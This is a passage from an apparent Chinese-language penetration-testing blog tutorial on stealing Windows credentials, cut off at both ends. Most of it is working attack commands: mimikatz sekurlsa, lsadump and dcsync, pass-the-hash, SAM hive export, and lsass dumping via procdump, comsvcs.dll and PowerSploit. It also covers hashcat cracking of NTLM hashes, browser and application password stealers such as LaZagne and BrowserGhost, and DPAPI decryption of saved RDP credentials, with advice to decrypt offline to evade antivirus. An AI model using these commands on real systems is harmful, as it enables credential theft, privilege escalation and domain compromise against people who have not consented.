function_">SEKURLSA::Pth</span> – Hash 传递  和  Key 传递（注 ：Over ‐Pass ‐the ‐Hash 的实际过程就是传递了相关的  Key(s)）。<br><span class="hljs-title function_">SEKURLSA::Tickets</span> – 列出最近所有已经过身份验证的用户的可用的  Kerberos 票证 ，包括使用用户帐户的上下文运 行的服务和本地计算机<br>在AD 中的计算机帐户。与  <span class="hljs-title function_">kerberos::list</span> 不同的是  sekurlsa 使用内存读取的方式 ，它不会受到密钥导出的限制。<br><span class="hljs-title function_">TOKEN::List</span> – 列出系统中的所有令牌。<br><span class="hljs-title function_">TOKEN::Elevate</span> – 假冒令牌。用于提升权限至  <span class="hljs-params">SYSTEM</span> 权限（默认情况下）或者是发现计算机中的域管理员的令牌。<br><span class="hljs-title function_">TOKEN::Elevate</span> /domainadmin – 假冒一个拥有域管理员凭证的令牌。<br></code></pre></td></tr></table></figure><p>接下来看几个常用的模块<br>sekurlsa模块</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nsis">privilege模块<br><span class="hljs-title function_">privilege::debug</span>  提升为debug权限<br>sekurlsa：模块 ，从lsass进程中提取passwords、 keys、pin、tickets等信息<br><span class="hljs-title function_">sekurlsa::msv</span>   获取HASH (LM,NTLM)<br><span class="hljs-title function_">sekurlsa::wdigest</span>  通过可逆的方式去内存中读取明文密码<br><span class="hljs-title function_">sekurlsa::Kerberos</span>  假如域管理员正好在登陆了我们的电脑 ，我们可以通过这个命令来获取域管理员的明文密码<br><span class="hljs-title function_">sekurlsa::tspkg</span>  通过tspkg读取明文密码<br><span class="hljs-title function_">sekurlsa::livessp</span> 通过livessp 读取明文密码<br><span class="hljs-title function_">sekurlsa::ssp</span> 通过ssp 读取明文密码<br><span class="hljs-title function_">sekurlsa::logonPasswords</span> 通过以上各种方法读取明文密码<br><span class="hljs-title function_">sekurlsa::process</span>  将自己的进程切换到lsass进程中 ，之前只是注入读取信息<br><span class="hljs-title function_">sekurlsa::minidump</span> <span class="hljs-keyword">file</span> 这个模块可以读取已经打包的内存信息<br><span class="hljs-title function_">sekurlsa::pth</span> 哈希传递<br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx<br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx<br></code></pre></td></tr></table></figure><p>process模块</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">process::list  列出进程列表<br>process::exports  导出进程列表<br>process::imports  导入列表<br>process::start  开始一个进程<br>process::stop  停止一个程序<br>process::suspend  冻结一个进程<br>process::resume  从冻结中恢复<br>process::run notepad 运行一个程序<br>process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口<br></code></pre></td></tr></table></figure><p>kerberos模块</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list 列出系统中的票据<br>kerberos::tgt 清除系统中的票据<br>kerberos::purge 导入票据到系统中<br>kerberos::ptc 票据路径<br></code></pre></td></tr></table></figure><p>lsadump模块</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nsis">在域控上执行)查看域kevin.com内指定用户root的详细信息 ，包括NTLM哈希等<br><span class="hljs-title function_">lsadump::dcsync</span> /domain:kevin.com /<span class="hljs-literal">user</span>:root<br>(在域控上执行)读取所有域用户的哈希<br><span class="hljs-title function_">lsadump::lsa</span> /patch<br>从sam.hive和<span class="hljs-params">system</span>.hive文件中获得NTLM Hash<br><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br>从本地SAM文件中读取密码哈希<br><span class="hljs-title function_">token::elevate</span><br><span class="hljs-title function_">lsadump::sam</span><br></code></pre></td></tr></table></figure><h3 id="SAM文件抓取密码"><a href="#SAM文件抓取密码" class="headerlink" title="SAM文件抓取密码"></a>SAM文件抓取密码</h3><h4 id="导出sam和system文件"><a href="#导出sam和system文件" class="headerlink" title="导出sam和system文件"></a>导出sam和system文件</h4><p>1、通多reg命令无工具导出</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651024.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651068.png" alt="image.png"><br>我们在cs使用文件功能下载两个文件，下载后的文件会在CS的客户端<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651227.png" alt="image.png"></p><p>2、通过nishang中的Copy-VSS进行复制 ，如果这个脚本运行在了DC服务器上 ， ntds.dit 和SYSTEM hive也能被拷 贝出来</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">copy</span> ‐vss    <span class="hljs-comment">//直接将文件保存在当前目录下</span><br><span class="hljs-keyword">copy</span> ‐vss ‐<span class="hljs-keyword">DestinationDir</span> 路径       <span class="hljs-comment">//指定保存文件的路径（必须是已经存在的路径）</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651252.png" alt="image.png"></p><h4 id="读取sam和system文件获取密码"><a href="#读取sam和system文件获取密码" class="headerlink" title="读取sam和system文件获取密码"></a>读取sam和system文件获取密码</h4><p>将读取到的文件改好名放在mimikatz下</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651436.png" alt="image.png"></p><h2 id="Mimikatz在线读取sam和lsass获取密码"><a href="#Mimikatz在线读取sam和lsass获取密码" class="headerlink" title="Mimikatz在线读取sam和lsass获取密码"></a>Mimikatz在线读取sam和lsass获取密码</h2><h3 id="在线读取sam文件"><a href="#在线读取sam文件" class="headerlink" title="在线读取sam文件"></a>在线读取sam文件</h3><p>使用mimikatz在线读取sam文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">分开的命令如下<br>privilege::debug<br>token:elevate<br>lsadump::sam<br>连起来<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651508.png" alt="image.png"><br>也可以使用CS自带的mimikatz</p><h3 id="在线读取lsass进程"><a href="#在线读取lsass进程" class="headerlink" title="在线读取lsass进程"></a>在线读取lsass进程</h3><p>从lsass进程中提取passwords、keys、pin、tickets等信息</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::msv 获取<span class="hljs-built_in">HASH</span> (LM,NTLM)<br>sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码<br>sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码<br>sekurlsa::tspkg 通过tspkg读取明文密码<br>sekurlsa::livessp 通过livessp 读取明文密码<br>sekurlsa::ssp 通过ssp 读取明文密码<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651543.png" alt="image.png"></p><h2 id="Mimikatz离线读取lsass进程抓取密码"><a href="#Mimikatz离线读取lsass进程抓取密码" class="headerlink" title="Mimikatz离线读取lsass进程抓取密码"></a>Mimikatz离线读取lsass进程抓取密码</h2><h3 id="导出lsass文件方式"><a href="#导出lsass文件方式" class="headerlink" title="导出lsass文件方式"></a>导出lsass文件方式</h3><p>1、使用任务管理器导出（windows NT 6）<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651641.png" alt="image.png"><br>2、使用procdump 导出lsass.dmp文件<br>ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows任务管理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> ‐accepteula ‐<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651665.png" alt="image.png"><br>3、使用PowerSploit 的Out-MiniDump模块，PowerSploit是一个基于 Powershell 的渗透工具包，可以选择创建进程的完整内存转储。<br>地址 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</a><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651965.png" alt="image.png"><br>4、comsvcs.dll，系统自带。通过comsvcs.dll的导出函数MiniDump实现dump内存<br>首先查看lsass.exe进程PID: tasklist | findstr lsass.exe<br>使用powershell导出 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 488 C:\lsass.dmp full<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651984.png" alt="image.png"></p><h3 id="读取lsass-dmp文件"><a href="#读取lsass-dmp文件" class="headerlink" title="读取lsass.dmp文件"></a>读取lsass.dmp文件</h3><p>使用mimikatz读取lsass.dmp文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651011.png" alt="image.png"><br> <a href="https://blog.csdn.net/weixin_42136837/article/details/112616369">https://blog.csdn.net/weixin_42136837&#x2F;article&#x2F;details&#x2F;112616369</a></p><h2 id="使用Hashcat和在线工具破解NTLM-Hash"><a href="#使用Hashcat和在线工具破解NTLM-Hash" class="headerlink" title="使用Hashcat和在线工具破解NTLM Hash"></a>使用Hashcat和在线工具破解NTLM Hash</h2><h3 id="Hashcat介绍"><a href="#Hashcat介绍" class="headerlink" title="Hashcat介绍"></a>Hashcat介绍</h3><p>Hashcat是一个密码恢复工具。直到2015年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt格式，以及 MySQL 和 Cisco PIX 中使用的算法。<br>下载地址： <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a><br>Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们选择hashcat binaries，这个是直接可以在Windows下运行的<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651063.png" alt="image.png"></p><h3 id="使用hashcat破解NTLM-Hash"><a href="#使用hashcat破解NTLM-Hash" class="headerlink" title="使用hashcat破解NTLM Hash"></a>使用hashcat破解NTLM Hash</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> ‐m <span class="hljs-number">1000</span> NTLM HASH 字典 ‐‐force<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651074.png" alt="image.png"></p><h3 id="网站破解"><a href="#网站破解" class="headerlink" title="网站破解"></a>网站破解</h3><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h2 id="浏览器、数据库等其他密码的抓取"><a href="#浏览器、数据库等其他密码的抓取" class="headerlink" title="浏览器、数据库等其他密码的抓取"></a>浏览器、数据库等其他密码的抓取</h2><h3 id="BrowserGhost浏览器抓取"><a href="#BrowserGhost浏览器抓取" class="headerlink" title="BrowserGhost浏览器抓取"></a>BrowserGhost浏览器抓取</h3><p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下：<br>实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集)<br>用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘)<br>可以解密chrome全版本密码(chrome80版本后加密方式变了)<br>Chrome已经可以获取login data、cookie、history、book了<br>命令：BrowserGhost.exe<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651391.png" alt="image.png"></p><h3 id="Sharp-HackBrowserData浏览器"><a href="#Sharp-HackBrowserData浏览器" class="headerlink" title="Sharp-HackBrowserData浏览器"></a>Sharp-HackBrowserData浏览器</h3><p>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓<br>命令：Sharp-HackBrowserData.exe<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651408.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651455.png" alt="image.png"></p><h3 id="SharpDecryptPwd数据库"><a href="#SharpDecryptPwd数据库" class="headerlink" title="SharpDecryptPwd数据库"></a>SharpDecryptPwd数据库</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">SharpDecryptPwd-master对密码已保存在 Windwos 系统上的部分程序进行解析,包<br><span class="hljs-built_in">Navicat,</span>TeamViewer,FileZilla,WinSCP,Xmangager系列产品<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐TeamViewer<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐FileZilla<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐WinSCP<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐Xmangager ‐<span class="hljs-selector-tag">p</span> Session_Path<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651537.png" alt="image.png"></p><h3 id="LaZagne各类密码"><a href="#LaZagne各类密码" class="headerlink" title="LaZagne各类密码"></a>LaZagne各类密码</h3><p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。<br>命令：laZagne.exe all</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span><br>laZagne<span class="hljs-selector-class">.exe</span> browsers<br>laZagne<span class="hljs-selector-class">.exe</span> browsers ‐firefox<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐oN<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐oA ‐output C:\Users\test\Desktop<br>laZagne<span class="hljs-selector-class">.exe</span> ‐h<br>laZagne<span class="hljs-selector-class">.exe</span> browsers ‐h<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐vv<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐quiet ‐oA<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651594.png" alt="image.png"></p><h2 id="Windows其他类型抓取NTLM-HASH工具"><a href="#Windows其他类型抓取NTLM-HASH工具" class="headerlink" title="Windows其他类型抓取NTLM HASH工具"></a>Windows其他类型抓取NTLM HASH工具</h2><h3 id="getpassword"><a href="#getpassword" class="headerlink" title="getpassword"></a>getpassword</h3><p>打开GetPass工具所在的目录。打开命令行环境。运行64位程GetPassword。运行该程序后,即可获得明文密码<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651710.png" alt="image.png"></p><h3 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h3><p>在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651782.png" alt="image.png"></p><h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h3><p>下载QuarksPwDump.exe,在命令行环境中输人 QuarksPwDump.exe –dump-hash-local 导出三个用户的NLMHash<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651807.png" alt="image.png"></p><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang中的 GET-PASSHashes.ps1可以可以获取hash</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span>‐<span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Get</span>‐<span class="hljs-variable">PassHashes</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span>‐<span class="hljs-variable">PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651866.png" alt="image.png"></p><h3 id="wce"><a href="#wce" class="headerlink" title="wce"></a>wce</h3><p>这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。这款工具也分为32位和64位两个不同的版本：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">‐l 列出登录的会话和NTLM凭据（默认值）<br>‐s 修改当前登录会话的NTLM凭据 参数：<span class="hljs-tag">&lt;<span class="hljs-name">用户名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">域名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">LM哈希</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">NT哈希</span>&gt;</span><br>‐r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次<br>‐c 用一个特殊的NTML凭据运行一个新的会话 参数：<br>‐e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次<br>‐o 保存所有的输出到一个文件 参数:<span class="hljs-tag">&lt;<span class="hljs-name">文件名</span>&gt;</span><br>‐i 指定一个LUID代替使用当前登录会话 参数:<br>‐d 从登录会话中删除NTLM凭据 参数:<br>‐a 使用地址 参数: <span class="hljs-tag">&lt;<span class="hljs-name">地址</span>&gt;</span><br>‐f 强制使用安全模式<br>‐g 生成LM和NT的哈希 参数<span class="hljs-tag">&lt;<span class="hljs-name">密码</span>&gt;</span><br>‐K 缓存kerberos票据到一个文件（unix和windows wce格式）<br>‐k 从一个文件中读取kerberos票据并插入到windows缓存中<br>‐w 通过摘要式认证缓存一个明文的密码<br>‐v 详细输出<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651906.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651973.png" alt="image.png"></p><h2 id="Windows-RDP凭证的抓取和密码破解"><a href="#Windows-RDP凭证的抓取和密码破解" class="headerlink" title="Windows RDP凭证的抓取和密码破解"></a>Windows RDP凭证的抓取和密码破解</h2><h3 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h3><p>Credentials的解密是Windows系统信息收集中非常重要的一环 ，其中包括各类敏感、重要的凭证（这个可以理解 为密码） ，接下来我们就讲解RDP凭证的抓取和破解<br>在我们点击保存密码后 ，Windows就通过MasterKey将我们的密码加密后保存在本地 ， 由于Windows还需要解密 从而使用 ，所以这个过程是可逆 ，也正因为这一缘由 ，我们只要拿到MasterKey就能将密码解出来。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651072.png" alt="image.png"></p><h3 id="凭证的查看"><a href="#凭证的查看" class="headerlink" title="凭证的查看"></a>凭证的查看</h3><p>查看凭证命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看mstsc的连接记录<br>cmdkey /list<br>查找本地的Credentials<br><span class="hljs-built_in">dir</span> /a %userprofile%\appdata\<span class="hljs-built_in">local</span>\microsoft\credentials\*<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651146.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651277.png" alt="image.png"></p><p>在线破解<br>1、使用mimikatz获取该文件的MasterKey的guid</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">mimikatz <span class="hljs-name">dpapi</span>::cred<br>/<span class="hljs-name">in</span>:<span class="hljs-name">C</span>:\Users\Administrator\appdata\local\microsoft\credentials\FF22A1FDA68FD8515B52C534E8655421<br></code></pre></td></tr></table></figure><p>所以用于加密凭据文件FF22A1FDA68FD8515B52C534E8655421B的MasterKey的guid就是 ：{c271c658-e61b- 4023-95d2-dfbf18b0aa33} ，所以我们只要从内存中找到这个guid对应的MasterKey的值即可<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651286.png" alt="image.png"><br>2、找到内存中对应的MasterKey</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::dpapi<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651341.png" alt="image.png"></p><p>3、最后打开mimikatz通过MasterKey值去解密凭据文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpapi::cred /in:凭据文件路径 /masterky:masterkey值<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mimikatz dpapi::cred<br>/in:C:\Users\Administrator\appdata\local\microsoft\credentials\FF<span class="hljs-number">22</span>A<span class="hljs-number">1</span>FDA<span class="hljs-number">68</span>FD<span class="hljs-number">8515</span>B<span class="hljs-number">52</span>C<span class="hljs-number">534E8655421</span>  /masterkey:b<span class="hljs-number">3354</span><span class="hljs-keyword">c</span><span class="hljs-number">56</span>cd<span class="hljs-number">35630</span>d<span class="hljs-number">10</span>aa<span class="hljs-number">7477</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">16e9</span>b<span class="hljs-number">94587</span>f<span class="hljs-number">1</span>dc<span class="hljs-number">6</span>f<span class="hljs-number">9</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>fcb<span class="hljs-number">72</span>a<span class="hljs-number">5e4</span>a<span class="hljs-number">25</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>aab<span class="hljs-number">8</span>fa<span class="hljs-number">242194666</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span><span class="hljs-keyword">cc</span><span class="hljs-number">4</span>be<span class="hljs-number">9</span> <span class="hljs-number">485</span><span class="hljs-keyword">c</span><span class="hljs-number">31</span>af<span class="hljs-number">555</span>b<span class="hljs-number">01</span>a<span class="hljs-number">49</span>abbfbb<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">00</span>d<span class="hljs-number">209</span>da<span class="hljs-number">624</span>f<span class="hljs-number">33</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651419.png" alt="image.png"></p><h3 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h3><p>由于我们不能保证我们的mimikatz是免杀状态 ，为了避免被对方发现 ，我们可以离线解密从而达到获取密码的目的其实很简单 ，就是把目标的文件和内存下载回来 ，在vps或本机上进行mimikatz解密即可。</p><h4 id="1、下载目标内存"><a href="#1、下载目标内存" class="headerlink" title="1、下载目标内存"></a>1、下载目标内存</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">procdump<span class="hljs-selector-class">.exe</span> ‐accepteula ‐ma lsass<span class="hljs-selector-class">.exe</span> lsass1<span class="hljs-selector-class">.dump</span>  导出lsass<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651547.png" alt="image.png"></p><h4 id="2、下载目标的Credentials文件"><a href="#2、下载目标的Credentials文件" class="headerlink" title="2、下载目标的Credentials文件"></a>2、下载目标的Credentials文件</h4><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651569.png" alt="image.png"></p><h4 id="3、用mimikatz载入dump回来的内存"><a href="#3、用mimikatz载入dump回来的内存" class="headerlink" title="3、用mimikatz载入dump回来的内存"></a>3、用mimikatz载入dump回来的内存</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Sekurlsa::minidump l sass<span class="hljs-number">1.</span>dump<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651714.png" alt="image.png"></p><h4 id="4、获取Credentials的GUID"><a href="#4、获取Credentials的GUID" class="headerlink" title="4、获取Credentials的GUID"></a>4、获取Credentials的GUID</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">dpapi<span class="hljs-number">::</span>cred /in:FF22A1FDA68FD8515B52C5<span class="hljs-number">34E8655421</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651825.png" alt="image.png"></p><h4 id="5、获取内存中所有的MasterKey"><a href="#5、获取内存中所有的MasterKey" class="headerlink" title="5、获取内存中所有的MasterKey"></a>5、获取内存中所有的MasterKey</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlsa::dpapi<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651015.png" alt="image.png"></p><h4 id="6、利用MasterKey解密"><a 